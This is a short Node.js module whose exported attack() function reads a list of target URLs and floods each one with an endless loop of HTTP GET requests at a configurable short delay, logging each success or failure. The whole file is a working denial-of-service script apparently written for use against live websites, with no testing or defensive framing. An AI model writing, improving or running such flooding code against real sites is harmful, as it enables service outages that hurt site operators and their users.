const axios = require("axios");
const fileHelper = require("../utils/fileHelper");
const pathes = require("../pathes");
const settingsManager = require("../managers/settingsManager");
require('dotenv').config();
//const delay = 0.1; //default: 10

const request = async (url, delay) => {
    while (true) {
        try {
            await axios.get(url);

            console.log(
                `Success req to ${url}. Status: SUCCESS.`
            );
        } catch (error) {
            console.log(
                `Failed req to ${url}. Status: ERROR.`
            );
        }

        await new Promise((req) => setInterval(req, delay));
    }
};

function attack() {

    return new Promise((resolve, reject) => {
        const targets = fileHelper.readSync(pathes.targetsPath);
        const delay = settingsManager.getDelay(); //default: 10

        targets.forEach((link) => request(link, delay));
    });
};

module.exports = {attack}
